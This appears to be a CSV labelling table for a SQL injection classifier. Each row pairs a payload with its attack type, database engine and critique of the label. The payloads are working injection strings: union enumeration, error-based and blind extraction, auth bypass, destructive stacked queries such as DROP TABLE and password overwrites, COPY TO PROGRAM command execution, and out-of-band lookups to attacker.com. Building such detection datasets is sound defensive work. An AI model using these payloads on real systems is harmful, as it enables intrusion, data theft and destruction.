id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
40484,1;SELECT TOP 1 table_name FROM information_schema.tables--,union_based,mssql,0.9,info_schema enum,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,mysql,1;SELECT TOP 1 table_name FROM information_schema.tables--,False,0,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal
40485,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",union_based,mssql,0.9,sysobjects union,RELABEL,reasoning too short (16 chars),union_based,mssql,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",False,0,union_based,mssql,Pattern match: 'union select' → union_based (P7); DB signature: mssql,union_based,mssql,UNION SELECT structure
40486,' UNION SELECT NULL FROM dual--,union_based,oracle,0.95,dual union,RELABEL,reasoning too short (10 chars),union_based,oracle,' UNION SELECT NULL FROM dual--,False,0,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
40487,' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,out_of_band,oracle,0.95,UTL_INADDR OOB,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
40488,1 AND ROWNUM=1 AND 1=1--,boolean_blind,oracle,0.9,ROWNUM boolean,RELABEL,reasoning too short (14 chars),boolean_blind,oracle,1 AND ROWNUM=1 AND 1=1--,False,0,boolean_blind,oracle,Pattern match: 'and 1=1' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,"boolean condition (1=1, RLIKE, or ELT)"
40489,"' UNION SELECT NULL,NULL FROM dual--",union_based,oracle,0.95,dual union,RELABEL,reasoning too short (10 chars),union_based,oracle,"' UNION SELECT NULL,NULL FROM dual--",False,0,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
40490,' AND 1=(SELECT COUNT(*) FROM all_tables)--,union_based,oracle,0.95,all_tables enum,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,oracle,' AND 1=(SELECT COUNT(*) FROM all_tables)--,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
40491,'; SELECT PG_SLEEP(5)--,time_blind,postgresql,0.95,PG_SLEEP,RELABEL,reasoning too short (8 chars),time_blind,postgresql,'; SELECT PG_SLEEP(5)--,False,0,time_blind,postgresql,Pattern match: 'pg_sleep(' → time_blind (P5); DB signature: postgresql,time_blind,postgresql,time function 'sleep(' detected
40492,"' UNION SELECT NULL::text,NULL::text--",union_based,postgresql,0.9,union text,RELABEL,reasoning too short (10 chars),union_based,postgresql,"' UNION SELECT NULL::text,NULL::text--",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40493,1;SELECT version()--,union_based,postgresql,0.9,version enum,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,1;SELECT version()--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40494,' AND 1=(SELECT COUNT(*) FROM pg_tables)--,union_based,postgresql,0.9,pg_tables enum,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,' AND 1=(SELECT COUNT(*) FROM pg_tables)--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40495,'; COPY (SELECT '') TO PROGRAM 'id'--,stacked_queries,postgresql,0.95,COPY RCE,RELABEL,reasoning too short (8 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,'; COPY (SELECT '') TO PROGRAM 'id'--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40496,"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",error_based,mysql,0.9,EXTRACTVALUE error,RELABEL,reasoning too short (18 chars),error_based,mysql,"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",False,0,error_based,mysql,Pattern match: 'extractvalue(' → error_based (P4); DB signature: mysql,error_based,mysql,error function 'extractvalue(' detected
40497,"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",error_based,mysql,0.9,UPDATEXML error,RELABEL,reasoning too short (15 chars),error_based,mysql,"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",False,0,error_based,mysql,Pattern match: 'updatexml(' → error_based (P4); DB signature: mysql,error_based,mysql,error function 'updatexml(' detected
40498,"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",error_based,mysql,0.9,floor rand error,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",False,0,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal
40499,"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--",error_based,mysql,0.9,GTID_SUBSET error,RELABEL,reasoning too short (17 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40500,"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",error_based,mysql,0.9,JSON_KEYS error,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40501,1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--,error_based,mysql,0.9,POLYGON geometry,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40502,' AND EXP(~(SELECT * FROM (SELECT user())x))--,error_based,mysql,0.9,EXP error,RELABEL,reasoning too short (9 chars),error_based,mysql,' AND EXP(~(SELECT * FROM (SELECT user())x))--,False,0,error_based,generic,Pattern match: 'exp(~' → error_based (P4); DB signature: generic,error_based,generic,error function 'exp(~' detected
40503,' AND SLEEP(5) AND '1'='1,time_blind,mysql,0.95,SLEEP time,RELABEL,reasoning too short (10 chars),time_blind,mysql,' AND SLEEP(5) AND '1'='1,False,0,time_blind,mysql,Pattern match: 'sleep(' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected
40504,1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--,time_blind,mysql,0.95,SELECT SLEEP,RELABEL,reasoning too short (12 chars),time_blind,mysql,1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--,False,0,time_blind,mysql,Pattern match: 'sleep(' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected
40505,"' AND IF(1=1,SLEEP(5),0)--",time_blind,mysql,0.95,IF SLEEP,RELABEL,reasoning too short (8 chars),time_blind,mysql,"' AND IF(1=1,SLEEP(5),0)--",False,0,time_blind,mysql,Pattern match: 'sleep(' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected
40506,'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--,time_blind,mssql,0.95,IF WAITFOR,RELABEL,reasoning too short (10 chars),time_blind,mssql,'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
40507,1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--,time_blind,mysql,0.95,SELECT SLEEP,RELABEL,reasoning too short (12 chars),time_blind,mysql,1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--,False,0,time_blind,mysql,Pattern match: 'sleep(' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected
40508,"' AND SUBSTRING(username,1,1)='a' AND '1'='1",boolean_blind,generic,0.9,SUBSTRING boolean,RELABEL,reasoning too short (17 chars),boolean_blind,generic,"' AND SUBSTRING(username,1,1)='a' AND '1'='1",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
40509,"' AND ASCII(SUBSTR(username,1,1))>64--",boolean_blind,generic,0.9,ASCII boolean,RELABEL,reasoning too short (13 chars),boolean_blind,generic,"' AND ASCII(SUBSTR(username,1,1))>64--",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
40510,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,boolean_blind,generic,0.9,COUNT boolean,RELABEL,reasoning too short (13 chars),boolean_blind,generic,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,False,0,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal
40511,"' AND MID(version(),1,1)='5'--",boolean_blind,generic,0.9,MID boolean,RELABEL,reasoning too short (11 chars),boolean_blind,generic,"' AND MID(version(),1,1)='5'--",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
40512,"' AND BINARY SUBSTRING(password,1,1)='a'--",boolean_blind,generic,0.9,BINARY boolean,RELABEL,reasoning too short (14 chars),boolean_blind,generic,"' AND BINARY SUBSTRING(password,1,1)='a'--",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
40513,' OR 1=1--,auth_bypass,generic,0.95,OR 1=1,RELABEL,reasoning too short (6 chars),auth_bypass,generic,' OR 1=1--,False,0,boolean_blind,generic,Pattern match: 'or 1=1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
40514,' OR 1 = 1--,auth_bypass,generic,0.95,OR 1 = 1,RELABEL,reasoning too short (8 chars),auth_bypass,generic,' OR 1 = 1--,False,0,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
40515,'; DROP TABLE users; --,stacked_queries,generic,0.95,DROP TABLE,RELABEL,reasoning too short (10 chars),stacked_queries,generic,'; DROP TABLE users; --,False,0,stacked_queries,generic,Pattern match: '; drop' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec
40516,"'; INSERT INTO users VALUES('hacker','pw')--",stacked_queries,generic,0.95,INSERT values,RELABEL,reasoning too short (13 chars),stacked_queries,generic,"'; INSERT INTO users VALUES('hacker','pw')--",False,0,stacked_queries,generic,Pattern match: '; insert' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec
40517,1'; UPDATE users SET password='hacked' WHERE '1'='1,stacked_queries,generic,0.95,UPDATE values,RELABEL,reasoning too short (13 chars),stacked_queries,generic,1'; UPDATE users SET password='hacked' WHERE '1'='1,False,0,stacked_queries,generic,Pattern match: '; update' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec
40518,'; EXEC('SELECT 1')--,stacked_queries,generic,0.95,EXEC select,RELABEL,reasoning too short (11 chars),stacked_queries,generic,'; EXEC('SELECT 1')--,False,0,stacked_queries,generic,Pattern match: '; exec' → stacked_queries (P8); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec
40519,1; SELECT * FROM users--,stacked_queries,generic,0.95,SELECT users,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,1; SELECT * FROM users--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40520,"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",out_of_band,mysql,0.95,LOAD_FILE OOB,RELABEL,reasoning too short (13 chars),out_of_band,mysql,"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",False,0,out_of_band,generic,Pattern match: 'load_file(' → out_of_band (P6); DB signature: generic,union_based,generic,UNION SELECT structure
40521,'; EXEC master..xp_dirtree '//attacker.com/a'--,out_of_band,mssql,0.95,xp_dirtree OOB,RELABEL,reasoning too short (14 chars),out_of_band,mssql,'; EXEC master..xp_dirtree '//attacker.com/a'--,False,0,out_of_band,generic,Pattern match: 'xp_dirtree' → out_of_band (P6); DB signature: generic,stacked_queries,generic,semicolon followed by DDL/DML/exec
40522,"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",out_of_band,mysql,0.95,LOAD_FILE OOB,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,generic,"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",False,0,boolean_blind,generic,Pattern match: 'and 1=2' → boolean_blind (P3); DB signature: generic,heavy_query,generic,contains 7+ digit number (DoS-style payload)
40523,' UNION SELECT NULL--,union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,' UNION SELECT NULL--,False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40524,"' UNION SELECT NULL,NULL--",union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,"' UNION SELECT NULL,NULL--",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40525,"' UNION SELECT NULL,NULL,NULL--",union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,"' UNION SELECT NULL,NULL,NULL--",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40526,"' UNION SELECT NULL,NULL,NULL,NULL--",union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,"' UNION SELECT NULL,NULL,NULL,NULL--",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40527,"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",union_based,generic,0.9,UNION NULL enum,RELABEL,reasoning too short (15 chars),union_based,generic,"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40528,"' UNION ALL SELECT NULL,NULL--",union_based,generic,0.9,UNION ALL NULL,RELABEL,reasoning too short (14 chars),union_based,generic,"' UNION ALL SELECT NULL,NULL--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40529,"1 UNION SELECT @@version,NULL--",union_based,generic,0.9,UNION version,RELABEL,reasoning too short (13 chars),union_based,generic,"1 UNION SELECT @@version,NULL--",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40530,"1 UNION SELECT user(),database()--",union_based,generic,0.9,UNION user db,RELABEL,reasoning too short (13 chars),union_based,generic,"1 UNION SELECT user(),database()--",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
40531,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",union_based,generic,0.9,UNION table enum,RELABEL,reasoning too short (16 chars),union_based,generic,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",False,0,union_based,mysql,Pattern match: 'union select' → union_based (P7); DB signature: mysql,union_based,mysql,UNION SELECT structure
40532,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",union_based,generic,0.9,UNION column enum,RELABEL,reasoning too short (17 chars),union_based,generic,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",False,0,union_based,mysql,Pattern match: 'union select' → union_based (P7); DB signature: mysql,union_based,mysql,UNION SELECT structure
40533,' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,boolean_blind,generic,0.9,LENGTH boolean,RELABEL,reasoning too short (14 chars),boolean_blind,generic,' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,False,0,boolean_blind,generic,generic SQL keywords without specific signal,auth_bypass,generic,admin' prefix near boolean/comment context
40534,"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",boolean_blind,generic,0.9,SUBSTR boolean,RELABEL,reasoning too short (14 chars),boolean_blind,generic,"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40535,1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0,boolean_blind,generic,0.9,COUNT boolean,RELABEL,reasoning too short (13 chars),boolean_blind,generic,1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40536,"' AND ORD(MID(password,1,1))>64 AND '1'='1",boolean_blind,generic,0.9,ORD boolean,RELABEL,reasoning too short (11 chars),boolean_blind,generic,"' AND ORD(MID(password,1,1))>64 AND '1'='1",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
40537,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1",boolean_blind,generic,0.9,floor boolean,RELABEL,reasoning too short (13 chars),boolean_blind,generic,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
40538,' '1'='1,auth_bypass,generic,0.95,quote bypass,RELABEL,reasoning too short (12 chars),auth_bypass,generic,' '1'='1,False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40539,"1 UN ION SEL ECT NULL,NULL--",auth_bypass,generic,0.9,filter bypass,RELABEL,reasoning too short (13 chars),auth_bypass,generic,"1 UN ION SEL ECT NULL,NULL--",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40540,"1 NULL,NULL--",auth_bypass,generic,0.9,NULL bypass,RELABEL,reasoning too short (11 chars),auth_bypass,generic,"1 NULL,NULL--",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
40541,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",error_based,generic,0.9,floor version error,RELABEL,reasoning too short (19 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",False,0,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal
40542,"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",error_based,generic,0.9,EXTRACTVALUE error,RELABEL,reasoning too short (18 chars),error_based,generic,"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",False,0,error_based,mysql,Pattern match: 'extractvalue(' → error_based (P4); DB signature: mysql,error_based,mysql,error function 'extractvalue(' detected
40543,"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",error_based,generic,0.9,NAME_CONST error,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",False,0,boolean_blind,generic,Pattern match: 'and 1=1' → boolean_blind (P3); DB signature: generic,union_based,generic,UNION SELECT structure
